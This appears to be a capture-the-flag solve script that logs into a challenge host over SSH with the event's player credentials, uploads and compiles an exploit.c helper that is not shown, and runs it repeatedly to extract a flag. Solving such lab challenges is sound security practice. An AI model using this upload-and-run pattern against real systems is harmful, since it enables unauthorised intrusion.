#!/usr/bin/env python3
import re
from pathlib import Path

from pwn import context, log, ssh


HOST = "instancer.dalctf2026.com"
PORT = 59991
USER = "player"
PASSWORD = "dalctf"


def main() -> None:
    context.log_level = "info"

    src = Path(__file__).with_name("exploit.c").read_text()
    shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)

    shell.upload_data(src.encode(), "/tmp/exploit.c")
    log.info("uploaded exploit helper")

    compile_cmd = "gcc -O2 /tmp/exploit.c -o /tmp/exploit"
    result = shell.run(compile_cmd)
    result.recvall(timeout=10)
    if result.poll() != 0:
        raise SystemExit("remote compile failed")

    for attempt in range(1, 8):
        io = shell.run("for i in 1 2 3 4 5; do /tmp/exploit 2>/dev/null; echo; done")
        data = io.recvall(timeout=15)
        text = data.decode("latin-1", errors="ignore")
        match = re.search(r"dalctf\{[^}\n]+\}", text)
        if match:
            print(match.group(0))
            return
        log.warning("attempt %d did not recover a clean flag", attempt)

    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
